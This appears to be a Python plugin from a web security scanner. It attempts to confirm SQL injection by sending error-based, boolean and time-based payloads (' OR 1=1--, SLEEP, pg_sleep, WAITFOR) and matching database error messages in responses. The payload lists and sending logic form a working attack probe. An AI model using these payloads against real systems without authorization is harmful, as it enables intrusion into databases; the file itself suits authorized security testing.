"""
SqliPipeline — Pipeline de exploração de SQL Injection (Fase 3)

Tenta confirmar SQLi por:
1. Erro de banco de dados na resposta.
2. Comportamento diferencial com payloads booleanos.
3. Time-based blind (SLEEP/pg_sleep/waitfor).
"""

from __future__ import annotations

import re
import time
from typing import List, Tuple

from core.models import QueueItem
from plugins.pipelines import BasePipeline, _HttpResult, _http_send_item


_PAYLOADS_ERROR = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' AND '1'='2",
    "1' ORDER BY 1--",
    "'; SELECT SLEEP(0)--",
]

_PAYLOADS_BLIND_TIME = [
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
]

_DB_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider",
    r"odbc.*driver",
    r"ora-\d{5}",
    r"pg_query\(\).*error",
    r"unterminated string constant",
    r"syntax error.*near",
    r"sqlite.*error",
]


class SqliPipeline(BasePipeline):
    name = "SqliPipeline"
    MAX_ATTEMPTS = 6

    def _get_payloads(self, item: QueueItem) -> List[str]:
        return _PAYLOADS_ERROR + _PAYLOADS_BLIND_TIME

    def _select_payload(self, item: QueueItem, attempt_num: int) -> str:
        """Primeiras 6 tentativas: error-based. Seguintes: time-based blind."""
        if attempt_num <= len(_PAYLOADS_ERROR):
            return _PAYLOADS_ERROR[attempt_num - 1]
        idx = (attempt_num - len(_PAYLOADS_ERROR) - 1) % len(_PAYLOADS_BLIND_TIME)
        return _PAYLOADS_BLIND_TIME[idx]

    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
        return _http_send_item(item, payload, fallback_param="q", timeout=20)

    def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
        if result.status == 0:
            return "failed"

        body_lower = result.body.lower()

        # Error-based: padrões de erro de banco de dados
        for pattern in _DB_ERROR_PATTERNS:
            if re.search(pattern, body_lower):
                return "impact_proven"

        # Time-based: verificar se a resposta demorou (rudimentar via payload check)
        if "SLEEP" in payload or "pg_sleep" in payload or "WAITFOR" in payload:
            # O próprio timeout indica sucesso se não retornou erro
            if result.status in (200, 302) and result.body:
                return "partial"  # Não confirmado sem medir tempo real

        # Comportamento inesperado (500 com erro genérico pode indicar SQLi)
        if result.status == 500:
            return "partial"

        return "failed"
